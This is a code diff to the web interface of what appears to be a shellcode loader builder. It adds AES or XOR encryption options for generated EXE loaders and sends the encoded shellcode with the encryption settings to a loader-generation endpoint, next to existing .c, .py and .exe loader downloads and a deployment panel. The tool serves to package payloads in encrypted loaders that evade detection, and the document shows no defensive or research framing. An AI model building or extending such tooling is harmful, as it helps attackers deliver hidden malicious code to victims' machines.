@@ -194,10 +194,30 @@
             <button onclick="downloadStub('c')">.c Loader</button>
             <button onclick="downloadStub('python')">.py Loader</button>
             <button onclick="compileAndDownloadExe()">.exe Loader</button>
-            <button id="generateExeLoaderBtn">🔐 Generate AES-Encrypted EXE</button>
+            
+            <!-- Add loader encryption options -->
+            <div style="margin-top: 15px; border-top: 1px solid #ccc; padding-top: 15px;">
+                <h4>Encrypted EXE Loader Options</h4>
+                <div class="form-group">
+                    <label for="loaderEncryption">Loader Encryption:</label>
+                    <select id="loaderEncryption">
+                        <option value="aes">AES-128 (Recommended)</option>
+                        <option value="xor">XOR (Simple)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="loaderEncKey">Encryption Key (Optional):</label>
+                    <input type="text" id="loaderEncKey" placeholder="Leave blank for auto-generated key">
+                    <small style="display: block; color: #666;">- AES: 16 chars (will be padded/truncated)<br>- XOR: Any length (longer is better)</small>
+                </div>
+                <button id="generateExeLoaderBtn">🔐 Generate Encrypted EXE</button>
+            </div>
+            
             <!-- Fallback form in case JS fetch API has issues -->
             <form id="exeGeneratorForm" action="/generate_loader_exe" method="post" style="display:none;">
                 <input type="hidden" id="shellcodeInput" name="shellcode" value="">
+                <input type="hidden" id="encryptionTypeInput" name="encryption" value="aes">
+                <input type="hidden" id="encryptionKeyInput" name="key" value="">
             </form>
             <div id="deployOptions" style="display: none; margin-top: 15px; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
                 <h4>Deployment Options</h4>
@@ -605,14 +625,20 @@ int main() {
                 return;
             }
 
+            // Get encryption settings
+            const encType = document.getElementById('loaderEncryption').value;
+            const encKey = document.getElementById('loaderEncKey').value;
+
             // Show loading state
             this.innerHTML = '⏳ Generating...';
             this.disabled = true;
             
             // Try the form-based approach as a more reliable method
             try {
-                // Set the shellcode in the hidden form field
+                // Set the shellcode and encryption settings in the hidden form fields
                 document.getElementById('shellcodeInput').value = encodedShellcode;
+                document.getElementById('encryptionTypeInput').value = encType;
+                document.getElementById('encryptionKeyInput').value = encKey;
                 
                 // Create a download frame
                 let downloadFrame = document.getElementById('downloadFrame');
@@ -638,7 +664,7 @@ int main() {
                 setTimeout(() => {
                     this.innerHTML = '✅ Generated!';
                     setTimeout(() => {
-                        this.innerHTML = '🔐 Generate AES-Encrypted EXE';
+                        this.innerHTML = '🔐 Generate Encrypted EXE';
                         this.disabled = false;
                     }, 1500);
                 }, 2000);
@@ -647,16 +673,20 @@ int main() {
                 console.error('Error with form-based download:', err);
                 
                 // Fallback to fetch API if form submission fails
-                useFetchAPIForDownload(this);
+                useFetchAPIForDownload(this, encType, encKey);
             }
         });
         
         // Fallback function using fetch API
-        function useFetchAPIForDownload(buttonElement) {
+        function useFetchAPIForDownload(buttonElement, encType, encKey) {
             fetch('/generate_loader_exe', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ shellcode: encodedShellcode })
+                body: JSON.stringify({ 
+                    shellcode: encodedShellcode,
+                    encryption: encType,
+                    key: encKey
+                })
             })
             .then(response => {
                 if (!response.ok) {
@@ -683,7 +713,7 @@ int main() {
                 // Update button state
                 buttonElement.innerHTML = '✅ Generated!';
                 setTimeout(() => {
-                    buttonElement.innerHTML = '🔐 Generate AES-Encrypted EXE';
+                    buttonElement.innerHTML = '🔐 Generate Encrypted EXE';
                     buttonElement.disabled = false;
                 }, 1500);
             })
@@ -692,7 +722,7 @@ int main() {
                 alert('Error: ' + err.message);
                 buttonElement.innerHTML = '❌ Failed';
                 setTimeout(() => {
-                    buttonElement.innerHTML = '🔐 Generate AES-Encrypted EXE';
+                    buttonElement.innerHTML = '🔐 Generate Encrypted EXE';
                     buttonElement.disabled = false;
                 }, 1500);
             });
